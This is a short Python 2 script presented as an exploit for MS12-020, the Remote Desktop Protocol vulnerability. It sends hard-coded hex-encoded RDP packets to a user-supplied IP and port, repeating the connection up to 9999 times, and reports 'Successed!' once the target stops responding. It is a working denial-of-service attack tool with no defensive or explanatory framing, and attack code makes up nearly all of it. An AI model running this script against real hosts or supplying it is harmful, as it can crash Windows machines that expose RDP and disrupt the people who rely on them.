#!/usr/bin/env python
#Changed:Qiaoy<traceurq@gmail.com>
#date:2012.03.1

import socket
import sys
import time

buf0 = "030000130ee000000000000100080000000000".decode('hex')
buf1 = "030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c0".decode('hex')
buf2 = "0300000802f08028".decode('hex')
package = buf0+buf1+buf2

if len(sys.argv) != 3:
	print 'exp:'
	print '	python MS12-020_exploit.py [ip] [port]'
	sys.exit(1)
else:
	HOST = sys.argv[1]
	PORT = int(sys.argv[2])
	for i in xrange(9999):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(3)
		s.connect((HOST,PORT))
		try:
			s.send(package)
			rec = s.recv(1024)
			s.close()
		except:
			print 'Successed!'
			sys.exit(1)